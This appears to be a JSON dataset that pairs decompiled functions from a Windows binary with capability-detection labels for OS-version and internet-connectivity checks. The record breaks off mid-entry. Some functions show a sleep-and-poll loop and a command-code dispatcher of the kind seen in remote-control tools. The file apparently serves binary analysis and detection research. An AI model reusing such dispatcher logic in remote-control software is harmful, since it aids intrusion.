{
    "00081000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00081000(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    // [00] -r-x section size 69632 named .text\n    if (arg_10h != 0) {\n        for (; (arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1) {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 148
    },
    "0008102c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0008102c(uchar *arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    uchar *puVar1;\n    \n    puVar1 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_10h = arg_10h + -1;\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00081eb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00081eb9(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*param_1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "000820d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000820d3(uint dwMilliseconds)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*in_ECX, dwMilliseconds);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 114
    },
    "00082491": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00082491(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (param_1[4] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[4]);\n    }\n    fcn.000858fb();\n    if (*param_1 != 0) {\n        fcn.00085944(unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 107
    },
    "00082888": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00082888(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    param_2 = param_2 + 4;\n    uVar2 = fcn.00083185(\"start\");\n    iVar3 = fcn.00083169(uVar2);\n    if ((iVar3 == 0) || (*0x9659c != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.000858fb();\n    if (bVar1) {\n        fcn.0008cdaa(param_1);\n    }\n    else {\n        uVar2 = fcn.00083185(\"exit\");\n        iVar3 = fcn.00083169(uVar2);\n        fcn.000858fb();\n        if (iVar3 == 0) {\n            fcn.000831bb(param_2);\n            fcn.0008ccc5(param_2);\n        }\n        else {\n            *0x9659c = 0;\n            fcn.0008ca7e();\n        }\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00082e52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00082e52(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00082eeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00082eeb(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.000858fb();\n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00083138();\n        uVar1 = fcn.00085878();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00083027": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00083027(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 72
    },
    "00083138": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00083138(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "0008314a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008314a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n    return iVar1 * 2 + 2;\n}\n",
        "token_count": 80
    },
    "000831bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000831bb(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00083138();\n        uVar1 = fcn.0008590a();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "000831fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000831fd(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.0008314a();\n        uVar1 = fcn.00085878();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "000832e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000832e3(uint arg_8h)\n\n{\n    uint lpString2;\n    int32_t *in_ECX;\n    \n    if (*in_ECX == 0) {\n        lpString2 = 0;\n    }\n    else {\n        lpString2 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(*in_ECX);\n    }\n    fcn.000833ab(lpString2);\n    return arg_8h;\n}\n",
        "token_count": 102
    },
    "000833f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000833f3(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00083027();\n        uVar1 = fcn.0008590a();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "0008496d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008496d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uchar *hostshort;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint var_10h;\n    uint var_8h;\n    \n    *(param_1 + 0x234) = 1;\n    do {\n        uStack44 = 0x84993;\n        iVar1 = fcn.000856c3(&fcn.0008496d::var_10h);\n        uStack44 = *(iVar1 + 4);\n        arg_8h = &fcn.0008496d::var_8h;\n        hostshort = &stack0xffffffd0;\n        fcn.000856c3(arg_8h);\n        fcn.0008331a(arg_8h);\n        iVar1 = fcn.00085294(arg_8h, hostshort);\n        fcn.000858fb();\n        var_8h = 0;\n        fcn.000858fb();\n        var_10h = 0;\n        if (iVar1 != 0) {\n            fcn.000850cc(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(*(param_1 + 0x210));\n    } while (*(param_1 + 0x234) != 0);\n    return;\n}\n",
        "token_count": 308
    },
    "00084a77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00084a77(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t *piVar4;\n    uint var_14h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    iVar2 = *(in_ECX + 0x18);\n    if (iVar2 == 0) {\n        if (*(in_ECX + 0x14) < 0xc) {\n            return;\n        }\n        piVar4 = *(in_ECX + 0x10);\n        if (*piVar4 != -0x1b9944d7) {\n            fcn.00082d8c();\n            iVar2 = *(in_ECX + 0x18);\n            goto code_r0x00084abe;\n        }\n        *(in_ECX + 0x28) = piVar4[1];\n        *(in_ECX + 0x2c) = piVar4[2];\n        *(in_ECX + 0x18) = 1;\n    }\n    else {\ncode_r0x00084abe:\n        if (iVar2 != 1) {\n            return;\n        }\n    }\n    var_8h = *(in_ECX + 0x14) - 0xc;\n    if (var_8h < *(in_ECX + 0x28)) {\n        return;\n    }\n    fcn.00082d5a(*(in_ECX + 0x10) + 0xc, *(in_ECX + 0x28));\n    uVar1 = *(in_ECX + 0x2c);\n    piVar4 = NULL;\n    if (uVar1 < 0x1f) {\n        if (uVar1 == 0x1e) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x92524;\n            piVar4[3] = 0;\n            piVar4[4] = 0;\n        }\n        else if (uVar1 < 0xf) {\n            if (uVar1 == 0xe) {\n                iVar2 = fcn.000859a9();\n                if (iVar2 != 0) {\n                    piVar4 = fcn.000838cc();\n                    goto code_r0x00084f5a;\n                }\n            }\n            else if (uVar1 == 0) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924d4;\n                    goto code_r0x00084f5a;\n                }\n            }\n            else if (uVar1 == 2) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924fc;\n                    goto code_r0x00084f5a;\n                }\n            }\n            else if (uVar1 == 4) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924ec;\n                    goto code_r0x00084f5a;\n                }\n            }\n            else if (uVar1 == 6) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924e4;\ncode_r0x00084b74:\n                    piVar4[1] = 0;\n                    goto code_r0x00084f5a;\n                }\n            }\n            else if (uVar1 == 8) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924c4;\n                    goto code_r0x00084b95;\n                }\n            }\n            else if (uVar1 == 10) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924b4;\n                    goto code_r0x00084b74;\n                }\n            }\n            else {\n                if (uVar1 != 0xc) goto code_r0x00084f62;\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924dc;\n                    goto code_r0x00084f5a;\n                }\n            }\ncode_r0x00084f58:\n            piVar4 = NULL;\n        }\n        else if (uVar1 == 0x10) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            piVar4[1] = -1;\n            *piVar4 = 0x92420;\n        }\n        else if (uVar1 == 0x12) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x92504;\n        }\n        else if (uVar1 == 0x14) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x92544;\n        }\n        else if (uVar1 == 0x16) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x92554;\n        }\n        else if (uVar1 == 0x18) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x9250c;\n        }\n        else if (uVar1 == 0x1a) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x9255c;\n        }\n        else {\n            if (uVar1 != 0x1c) goto code_r0x00084f62;\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x92564;\n            piVar4[2] = 0;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n        }\n    }\n    else {\n        if (uVar1 < 0x2f) {\n            if (uVar1 == 0x2e) {\n                iVar2 = fcn.000859a9();\n                if (iVar2 == 0) goto code_r0x00084db8;\n                puVar3 = fcn.00083afb();\n                goto code_r0x00084dba;\n            }\n            if (uVar1 == 0x20) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924f4;\n                    goto code_r0x00084f5a;\n                }\n            }\n            else {\n                if (uVar1 != 0x22) {\n                    if (uVar1 == 0x24) {\n                        piVar4 = fcn.000859a9();\n                        if (piVar4 == NULL) goto code_r0x00084f58;\n                        *piVar4 = 0x92534;\n                    }\n                    else if (uVar1 == 0x26) {\n                        piVar4 = fcn.000859a9();\n                        if (piVar4 == NULL) goto code_r0x00084f58;\n                        *piVar4 = 0x9254c;\n                    }\n                    else if (uVar1 == 0x28) {\n                        piVar4 = fcn.000859a9();\n                        if (piVar4 == NULL) goto code_r0x00084f58;\n                        *piVar4 = 0x9253c;\n                    }\n                    else {\n                        if (uVar1 == 0x2a) {\n                            puVar3 = fcn.000859a9();\n                            if (puVar3 == NULL) {\ncode_r0x00084db8:\n                                puVar3 = NULL;\n                            }\n                            else {\n                                *puVar3 = 0x9256c;\n                                puVar3[1] = 0x92574;\n                            }\n                        }\n                        else {\n                            if (uVar1 != 0x2c) goto code_r0x00084f62;\n                            puVar3 = fcn.000859a9();\n                            if (puVar3 == NULL) goto code_r0x00084db8;\n                            *puVar3 = 0x92594;\n                            puVar3[1] = 0x9258c;\n                        }\ncode_r0x00084dba:\n                        piVar4 = -(puVar3 != NULL) & puVar3 + 1;\n                    }\n                    goto code_r0x00084f5a;\n                }\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x924bc;\n                    goto code_r0x00084b74;\n                }\n            }\n            goto code_r0x00084f58;\n        }\n        if (uVar1 == 0x30) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x9478c;\n        }\n        else if (uVar1 == 0x32) {\n            piVar4 = fcn.000859a9();\n            if (piVar4 == NULL) goto code_r0x00084f58;\n            *piVar4 = 0x94794;\n        }\n        else {\n            if (uVar1 == 0x33) {\n                fcn.0008f25f();\n                goto code_r0x00084f62;\n            }\n            if (uVar1 == 0x36) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x946e4;\n                    goto code_r0x00084b74;\n                }\n                goto code_r0x00084f58;\n            }\n            if (uVar1 == 0x38) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 == NULL) goto code_r0x00084f58;\n                *piVar4 = 0x9251c;\n            }\n            else if (uVar1 == 0x3a) {\n                piVar4 = fcn.000859a9();\n                if (piVar4 == NULL) goto code_r0x00084f58;\n                *piVar4 = 0x946a4;\ncode_r0x00084b95:\n                piVar4[2] = 0;\n            }\n            else {\n                if (uVar1 != 0x3b) goto code_r0x00084f62;\n                piVar4 = fcn.000859a9();\n                if (piVar4 == NULL) goto code_r0x00084f58;\n                *piVar4 = 0x9477c;\n            }\n        }\n    }\ncode_r0x00084f5a:\n    (**(*piVar4 + 4))(in_ECX + 0x30);\ncode_r0x00084f62:\n    (***arg_8h)(*(in_ECX + 0x2c), piVar4);\n    if (var_8h < *(in_ECX + 0x28) || var_8h == *(in_ECX + 0x28)) {\n        fcn.00082d8c();\n    }\n    else {\n        fcn.00082e12(in_ECX + 0x10);\n        fcn.00082c1e(&var_ch, *(in_ECX + 0x28) + 0xc, (*(in_ECX + 0x14) - *(in_ECX + 0x28)) + -0xc);\n        fcn.00082c65(&var_ch);\n        *(in_ECX + 0x18) = 0;\n        fcn.00084a77(arg_8h);\n        fcn.00082dff();\n        fcn.00082dff();\n    }\n    if (*(in_ECX + 0x34) != 0) {\n        fcn.00082d8c();\n    }\n    *(in_ECX + 0x18) = 0;\n    return;\n}\n",
        "token_count": 2900
    },
    "000853aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000853aa(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    if (*(in_ECX + 4) == 0) {\n        arg_8h_00 = fcn.00082c1e(&var_8h, 4, **(in_ECX + 0x3c));\n        fcn.00082c65(arg_8h_00);\n        fcn.00082dff();\n        *(in_ECX + 4) = 1;\n    }\n    fcn.00082e12(in_ECX + 8);\n    return arg_8h;\n}\n",
        "token_count": 155
    },
    "00085966": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00085966(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00081052();\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "00086e11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00086e11(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint extraout_var;\n    uint32_t arg_8h_01;\n    uint32_t arg_18h;\n    uint in_stack_ffffff7c;\n    uint uVar4;\n    uint in_stack_ffffff80;\n    uint uVar5;\n    uint in_stack_ffffff84;\n    int32_t iStack72;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack24;\n    \n    iVar1 = arg_8h + 0x10;\n    arg_8h_00 = iVar1;\n    fcn.000833f3(iVar1);\n    uVar3 = extraout_var;\n    fcn.000872de(arg_8h_00);\n    if (iStack72 == 0) {\n        uVar5 = 0;\n        fcn.000833f3(iVar1);\n        uVar3 = *(arg_8h + 0xc);\n        uVar4 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                          (unaff_ESI, extraout_ECX_01, uStack36, 0, 0, 0, &stack0xffffff80, 2);\n        fcn.000833ab(uVar4);\n        uVar3 = fcn.00083ce3(uVar3, uVar4, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffff7c, in_stack_ffffff80, uVar5)\n        ;\n        fcn.00084a3d(uVar3);\n        fcn.00083c49();\n        fcn.000858fb();\n        fcn.00082dff();\n    }\n    else {\n        arg_8h_01 = 0;\n        if (uStack24 != 0) {\n            do {\n                uVar4 = 0;\n                uVar5 = 0;\n                arg_18h = arg_8h_01;\n                iVar1 = fcn.00087275(arg_8h_01, &stack0xffffff7c);\n                if (iVar1 == 0) {\n                    uVar5 = 0;\n                    uVar2 = 0;\n                    fcn.000833f3(arg_8h + 0x10);\n                    uVar4 = *(arg_8h + 0xc);\n                    uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (uVar3, extraout_ECX_00, uStack44, 0, 0, 0, &stack0xffffff78, 1);\n                    fcn.000833ab(uVar3);\n                    arg_8h_00 = fcn.00083ce3(uVar4, uVar3, unaff_EDI, unaff_ESI, arg_18h, uVar5, uVar2, \n                                             in_stack_ffffff84);\n                    fcn.00084a3d(arg_8h_00);\n                    fcn.00083c49();\n                    fcn.000858fb();\n                    unaff_ESI = 0;\n                    fcn.00082dff();\n                    uVar3 = uVar4;\n                }\n                else {\n                    fcn.000833f3(arg_8h + 0x10);\n                    uVar3 = *(arg_8h + 0xc);\n                    uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (arg_8h_00, extraout_ECX, uStack44, arg_8h_01, uStack36, uStack40, \n                                       &stack0xffffff70, 0);\n                    fcn.000833ab(uVar2);\n                    arg_8h_00 = fcn.00083ce3(uVar3, uVar2, unaff_EDI, unaff_ESI, arg_18h, uVar4, uVar5, \n                                             in_stack_ffffff84);\n                    fcn.00084a3d(arg_8h_00);\n                    fcn.00083c49();\n                    fcn.000858fb();\n                    unaff_EDI = 0;\n                }\n                fcn.00082dff();\n                arg_8h_01 = arg_18h + 1;\n            } while (arg_8h_01 < uStack24);\n        }\n    }\n    if (iStack72 != 0) {\n        fcn.0008dc4d();\n    }\n    fcn.0008701b(*(arg_8h + 4), *(arg_8h + 0xc), 0);\n    fcn.0008721d();\n    fcn.00082dff();\n    return 0;\n}\n",
        "token_count": 1107
    },
    "0008701b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0008701b(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_4ch;\n    uint hThread;\n    uint var_24h;\n    uint var_20h;\n    uint hMutex;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint32_t var_8h;\n    \n    var_ch = in_ECX;\n    fcn.0008dd97();\n    var_8h = 0;\n    if (in_ECX[2] != 0) {\n        var_10h = 0;\n        do {\n            iVar5 = var_10h;\n            fcn.000856f9();\n            uVar2 = var_8h;\n            var_14h = var_8h + 1;\n            if (*(*in_ECX + iVar5 + 4) == arg_ch) {\n                fcn.000856f9();\n                fcn.000858fb();\n                piVar1 = var_ch;\n                fcn.000856f9();\n                iVar5 = (*_sym.imp.KERNEL32.dll_TerminateThread)(*(*piVar1 + uVar2 * 0xc), 0);\n                var_10h = iVar5;\n                fcn.000856f9();\n                uVar2 = var_ch[2];\n                if (var_14h <= uVar2) {\n                    iVar4 = var_14h * 0xc;\n                    uVar3 = var_14h;\n                    do {\n                        puVar6 = *var_ch + iVar4;\n                        uVar3 = uVar3 + 1;\n                        iVar4 = iVar4 + 0xc;\n                        puVar6[-3] = *puVar6;\n                        puVar6[-2] = puVar6[1];\n                        puVar6[-1] = puVar6[2];\n                        uVar2 = var_ch[2];\n                        iVar5 = var_10h;\n                    } while (uVar3 <= uVar2);\n                }\n                var_ch[2] = uVar2 - 1;\n                if (arg_10h != 0) {\n                    var_18h = 0;\n                    var_14h = 0;\n                    arg_8h_00 = fcn.00083ce3(arg_ch, 0, 0, 0, 0, 0, &var_18h, 3);\n                    fcn.00084a3d(arg_8h_00);\n                    fcn.00083c49();\n                    fcn.00082dff();\n                }\n                goto code_r0x00087081;\n            }\n            var_10h = var_10h + 0xc;\n            var_8h = var_14h;\n        } while (var_14h < in_ECX[2]);\n    }\n    iVar5 = 0;\ncode_r0x00087081:\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[4]);\n    return iVar5;\n}\n",
        "token_count": 743
    },
    "0008721d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008721d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        fcn.0008dc4d();\n    }\n    fcn.0008da15();\n    if (param_1[1] != 0) {\n        for (iVar1 = *(param_1[1] + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00082dff();\n        }\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 156
    },
    "00087275": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
